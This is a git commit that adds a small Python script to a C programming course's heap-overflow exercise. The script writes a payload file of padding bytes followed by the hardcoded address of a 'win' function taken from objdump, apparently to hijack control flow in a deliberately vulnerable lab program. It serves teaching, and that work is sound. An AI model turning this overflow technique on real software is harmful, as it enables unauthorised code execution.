951b1c2d8cd1ea98cbf6ac7c1113fde320e1e4a3
Pablo <pmora.develop@gmail.com>
2026-05-03 11:50:25 -0600

    Add heap overflow examples

---
+++ c-course/heap-overflow/gen_payload.py
@@ -0,0 +1,23 @@
+import struct
+
+def pack32(number):
+    # little endian 32 bit version of passed number
+    # this is the hardcoded address for the 'win' function in main.c
+    # the address was copied from the objdump
+    return struct.pack("<I", number)
+
+def generate_payload():
+    f = open("./payload", "wb")
+    payload = b"A"*32
+    payload += b"BBBB"
+    payload += pack32(0x080491c4)
+    payload += b"DDDD"
+    f.write(payload)
+    f.close()
+
+def main():
+    generate_payload()
+
+
+if __name__ == "__main__":
+    main()
